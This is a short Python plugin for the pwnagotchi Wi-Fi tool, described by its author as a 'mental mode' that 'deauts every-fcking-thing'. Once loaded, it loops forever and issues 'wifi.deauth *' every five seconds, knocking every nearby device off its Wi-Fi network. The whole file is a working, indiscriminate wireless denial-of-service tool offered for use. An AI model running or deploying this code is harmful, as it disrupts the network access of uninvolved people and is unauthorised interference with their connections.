import json
import logging
import os
from time import sleep
from pwnagotchi import plugins


class Mental(plugins.Plugin):
    __author__ = '33197631+dadav@users.noreply.github.com'
    __version__ = "0.1.0"
    __license__ = "GPL3"
    __description__ = "This will put pwnagotchi in mental mode. He deauts every-fcking-thing."

    def __init__(self):
        self.options = dict()
        self.running = False

    def on_loaded(self):
        logging.info("Mental plugin loaded.")
        self.running = True

    def on_unload(self, ui):
        self.running = False

    def on_ready(self, agent):
        while self.running:
            try:
                agent.run("wifi.deauth *")
            except Exception:
                pass
            finally:
                sleep(5)
